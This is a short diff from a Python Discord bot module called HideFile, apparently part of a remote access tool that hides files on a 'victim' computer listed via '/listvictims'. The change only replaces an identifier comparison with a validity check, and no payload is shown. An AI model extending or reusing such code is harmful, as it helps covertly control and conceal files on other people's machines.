@@ -18,7 +18,7 @@ class HideFile(commands.Cog):
         victim: Identifier of the affected computer (found via /listvictims).
         file: File path of the file to be hidden.
         """
-        if str(victim) == str(self.bot.identifier): 
+        if self.valid(victim): 
             if '"' in file:
                 file = file.replace('"','')
                 
